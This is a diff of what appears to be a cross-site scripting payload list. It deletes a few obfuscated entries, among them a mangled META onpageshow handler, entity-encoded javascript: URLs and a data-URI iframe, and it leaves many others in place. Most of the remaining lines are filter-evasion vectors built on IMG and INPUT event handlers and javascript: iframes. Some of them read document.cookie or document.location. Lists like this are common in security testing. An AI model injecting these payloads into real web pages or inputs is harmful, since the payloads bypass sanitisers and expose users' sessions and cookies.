@@ -73,7 +73,7 @@ An attacker can use yyy to send a malicious script to an unsuspecting user. The 
 <IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">
 <IMG SRC=x onshow="alert(String.fromCharCode(88,83,83))">
 <IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">
-<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(23)";
+
 <IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
 <INPUT TYPE="BUTTON" action="alert('yyy')"/>
 "><h23><IFRAME SRC="javascript:alert('yyy');"></IFRAME>">2323</h23>
@@ -89,12 +89,9 @@ An attacker can use yyy to send a malicious script to an unsuspecting user. The 
 <IFRAME SRC="javascript:alert('yyy');"></IFRAME>
 <IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
 <sVg><scRipt >alert&lpar;23&rpar; {Opera}
-<img src=``&NewLine; onerror=alert(23)&NewLine;
-<script /**/>/**/alert(23)/**/</script /**/
-<iframe/src="data:text/html,<svg &#232323;&#23230;load=alert(23)>">
-<meta content="&NewLine; 23 &NewLine;; JAVASCRIPT&colon; alert(23)" http-equiv="refresh"/>
+
 <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
-<form><iframe &#09;&#230;&#2323; src="javascript&#58;alert(23)"&#2323;&#230;&#09;;>
+
 http://www.google<script .com>alert(document.location)</script
 <script ^__^>alert(String.fromCharCode(49))</script ^__^
 </style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
